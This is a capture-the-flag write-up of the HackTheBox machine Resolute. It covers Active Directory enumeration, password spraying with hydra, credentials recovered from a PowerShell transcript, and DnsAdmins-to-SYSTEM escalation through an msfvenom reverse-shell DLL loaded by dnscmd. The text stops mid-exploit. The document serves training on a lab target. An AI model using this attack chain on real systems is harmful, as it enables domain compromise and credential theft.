---
title: "HackTheBox Writeup: Resolute"
date: 2020-07-20T14:22:55+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---

While Resolute starts very easy and generic the privilege escalation part reflects a useful and realistic scenario which is definintely a good addition to my Windows pentesting toolbox.

Much like in Monteverde here all we need to obtain the user shell is doing some simple standard Windows enumeration with the usual tools, and the privilege escalation phase is about exploiting the permissions of a Windows group, that allows us to escalate from DnsAdmin to SYSTEM in a couple commands.

![img](/images/writeup-resolute/1.png)

---

## Remote enumeration

Let's start with the usual nmap scan to cover all ports, identify services, and run a few useful scripts to gather more information from them:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/resolute]
└──╼ $cat fullScan.nmap
# Nmap 7.80 scan initiated Sun Dec  8 20:06:01 2019 as: nmap -sV -sC -p- -oA fullScan 10.10.10.169
Nmap scan report for 10.10.10.169
Host is up (0.21s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-08 20:03:20Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
49906/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=12/8%Time=5DED553D%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m45s, deviation: 4h37m10s, median: 7m43s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2019-12-08T12:04:14-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-12-08T20:04:12
|_  start_date: 2019-12-08T18:54:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  8 20:58:43 2019 -- 1 IP address (1 host up) scanned in 3162.16 seconds
```

The list of services reminds that of an Active Directory domain controller, with Kerberos, several instances of MS-RPC, LDAP, DNS, SMB, and WinRM.

So to enumerate these services automatically a good choice I always resort to is enum4linux, which is able to retrieve quite a lot of data, namely usernames, group names, and group memberships:

```aaa
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $enum4linux -a 10.10.10.169 2>/dev/null
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec  9 10:24:04 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.169
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.169    |
 ==================================================== 
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.169    |
 ============================================ 
Looking up status of 10.10.10.169
No reply from 10.10.10.169

 ===================================== 
|    Session Check on 10.10.10.169    |
 ===================================== 
[+] Server 10.10.10.169 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.169    |
 =========================================== 
Unable to initialize messaging context
Domain Name: MEGABANK
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.169    |
 ====================================== 
[+] Got OS info for 10.10.10.169 from smbclient: 
[+] Got OS info for 10.10.10.169 from srvinfo:
Unable to initialize messaging context
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

 ========================================= 
|    Share Enumeration on 10.10.10.169    |
 ========================================= 
Unable to initialize messaging context

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.169

 ==================================================== 
|    Password Policy Information for 10.10.10.169    |
 ==================================================== 


[+] Attaching to 10.10.10.169 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

	[+] MEGABANK
	[+] Builtin

[+] Password Info for Domain: MEGABANK

	[+] Minimum password length: 7
	[+] Password history length: 24
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.169    |
 ============================== 

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+] Getting builtin group memberships:
Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group 'Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group 'System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+] Getting local group memberships:
Group 'DnsAdmins' (RID: 1101) has member: Couldn't lookup SIDs
Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Contractors] rid:[0x44f]

[+] Getting domain group memberships:
Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\ryan
Group 'Domain Users' (RID: 513) has member: MEGABANK\marko
Group 'Domain Users' (RID: 513) has member: MEGABANK\sunita
Group 'Domain Users' (RID: 513) has member: MEGABANK\abigail
Group 'Domain Users' (RID: 513) has member: MEGABANK\marcus
Group 'Domain Users' (RID: 513) has member: MEGABANK\sally
Group 'Domain Users' (RID: 513) has member: MEGABANK\fred
Group 'Domain Users' (RID: 513) has member: MEGABANK\angela
Group 'Domain Users' (RID: 513) has member: MEGABANK\felicia
Group 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
Group 'Domain Users' (RID: 513) has member: MEGABANK\ulf
Group 'Domain Users' (RID: 513) has member: MEGABANK\stevie
Group 'Domain Users' (RID: 513) has member: MEGABANK\claire
Group 'Domain Users' (RID: 513) has member: MEGABANK\paulo
Group 'Domain Users' (RID: 513) has member: MEGABANK\steve
Group 'Domain Users' (RID: 513) has member: MEGABANK\annette
Group 'Domain Users' (RID: 513) has member: MEGABANK\annika
Group 'Domain Users' (RID: 513) has member: MEGABANK\per
Group 'Domain Users' (RID: 513) has member: MEGABANK\claude
Group 'Domain Users' (RID: 513) has member: MEGABANK\melanie
Group 'Domain Users' (RID: 513) has member: MEGABANK\zach
Group 'Domain Users' (RID: 513) has member: MEGABANK\simon
Group 'Domain Users' (RID: 513) has member: MEGABANK\naoki
Group 'Domain Admins' (RID: 512) has member: MEGABANK\Administrator
Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
Group 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
Group 'Schema Admins' (RID: 518) has member: MEGABANK\Administrator
Group 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
Group 'Contractors' (RID: 1103) has member: MEGABANK\ryan

 ======================================================================= 
|    Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ============================================= 
|    Getting printer info for 10.10.10.169    |
 ============================================= 
Unable to initialize messaging context
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Dec  9 10:28:04 2019
```

There's one line in the output above which can be easily missed but it's extremely important:

```aaa
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
```

Apparently one of those users, marko, had their password set to "Welcome123!", looks like a temporary password set for a new employee. Trying the credentials marko:Welcome123! on SMB gives us an error though so the user already changed it.

If we are lucky we may be able to find another user who forgot to change their default password from when they first joined, so let's build two dictionaries containing all usernames and the password found in the description field above, not knowing whether the exclamation point was part of the password or of the sentence I included both versions just to be sure:

```aaa
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $cat users
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $cat passwords
Welcome123!
Welcome123
```

---

## Password spraying

Launching hydra against SMB with those two wordlists finds a match, melanie forgot to change the default password:

```aaa
┌─[✗]─[baud@parrot]─[~/HTB/resolute]
└──╼ $hydra -L users -P passwords smb://10.10.10.169
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-25 20:21:59
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 46 login tries (l:23/p:2), ~46 tries per task
[DATA] attacking smb://10.10.10.169:445/
[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-25 20:22:17
```

Looks like we have a way inside the box now:

```aaa
User: melanie
Pass: Welcome123!
```

Melanie is able to login through WinRM so I used evil-winrm to connect to the box since it provides some very useful features:

```aaa
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents>
```

---

## Local enumeration and new credentials

Looking into the Users folder reveals the existence of another user, ryan:

```aaa
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
d-----        9/25/2019  10:43 AM                Administrator                                                                                                                                                                                           
d-----        12/4/2019   2:46 AM                melanie                                                                                                                                                                                                 
d-r---       11/20/2016   6:39 PM                Public                                                                                                                                                                                                  
d-----        9/27/2019   7:05 AM                ryan
```

At first C:\ doesn't seem to hold anything interesting:

```aaa
*Evil-WinRM* PS C:\> get-childitem


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
d-----        9/25/2019   6:19 AM                PerfLogs                                                                                                                                                                                                
d-r---        9/25/2019  12:39 PM                Program Files                                                                                                                                                                                           
d-----       11/20/2016   6:36 PM                Program Files (x86)                                                                                                                                                                                     
d-r---        12/4/2019   2:46 AM                Users                                                                                                                                                                                                   
d-----        12/4/2019   5:15 AM                Windows
```

But looking for hidden content reveals a PSTranscripts folder:

```aaa
*Evil-WinRM* PS C:\> get-childitem -hidden


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN                                                                                                                                                                                            
d--hsl        9/25/2019  10:17 AM                Documents and Settings                                                                                                                                                                                  
d--h--        9/25/2019  10:48 AM                ProgramData                                                                                                                                                                                             
d--h--        12/3/2019   6:32 AM                PSTranscripts                                                                                                                                                                                           
d--hs-        9/25/2019  10:17 AM                Recovery                                                                                                                                                                                                
d--hs-        9/25/2019   6:25 AM                System Volume Information                                                                                                                                                                               
-arhs-       11/20/2016   5:59 PM         389408 bootmgr                                                                                                                                                                                                 
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT                                                                                                                                                                                                 
-a-hs-        2/25/2020  11:01 AM      402653184 pagefile.sys
```

Inside a new invisible subfolder is a text file containing the history of some commands executed through PowerShell:

```aaa
Evil-WinRM* PS C:\PSTranscripts\20191203> more PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

In the "net use" command ryan's credentials are leaked:

```aaa
User: ryan
Pass: Serv3r4Admin4cc123!
```

Ryan has WinRM rights as well so we can login as him using evil-winrm again:

```aaa
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents>
```

There's a note on the desktop:

```aaa
*Evil-WinRM* PS C:\Users\ryan\desktop> more note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

This is a hint on a scheduled task which reverts some system configuration changes to their old values, it's done to ensure multiple people can root the box on the same server without resetting every time.

ryan is a DNS administrator, we can find this out by taking a look at our group memberships with the *whoami* command:

```aaa
*Evil-WinRM* PS C:\Users\ryan\desktop> whoami /all

USER INFORMATION
----------------

User Name     SID                                           
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                                     
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group             
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group             
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

---

## Privileged arbitrary DLL load as DnsAdmin

When in control of a DnsAdmin account privileges can be escalated up to SYSTEM by exploiting the capability of the DNS service of importing and executing code from a DLL ([source](https://adsecurity.org/?p=4064)).

This allows us to escalate privileges because the DNS service is running under the local SYSTEM account, which means that by being able to import any DLL we want into this service process we can execute arbitrary code as the operating system's most privileged account.

The exploitation process is rather simple, first a DLL is created, it can either be done manually by compiling the native code with Visual Studio, mingw, or any compiler for Windows or that supports cross compiling, or with a tool like msfvenom, which takes much less effort and so that's the path I'll follow:

```aaa
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.144  LPORT=9999 -f dll -o res.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 5120 bytes
Saved as: res.dll
```

It has to be said that because the AV seems to be so hypervigilant on this box dropping the msfvenom DLL on the disk will upset Defender instantly, so I'll host it via SMB and refer to it using an UNC path instead (while this way we can bypass Defender other AV solutions will most likely still catch the payload at some point, but since there's no other product like that installed let's not worry about it):

```aaa
┌─[baud@parrot]─[~/HTB/resolute]
└──╼ $sudo /usr/share/doc/python-impacket/examples/smbserver.py -smb2support share ~/HTB/resolute
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then we update the DNS registry entries to make it include our evil DLL:

```aaa
*Evil-WinRM* PS C:\Users\ryan\desktop> dnscmd Resolute.megabank.local /config /serverlevelplugindll //10.10.14.144/share\res.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

And restart the DNS service to make it load the DLL:

```aaa
*Evil-WinRM* PS C:\Users\ryan\desktop> c:\windows\system32\sc.exe stop dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\desktop> c:\windows\system32\sc.exe start dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 596
        FLAGS              :
```

Because *sc* is not only the utility Windows uses to interface with the Services Control Manager (SCM), but also a PowerShell keyword, I had to specify its absolute path since evil-winrm starts a PowerShell shell and the language's keyword would take priority.

Almost instantly the SMB server gets an incoming connection:

```aaa
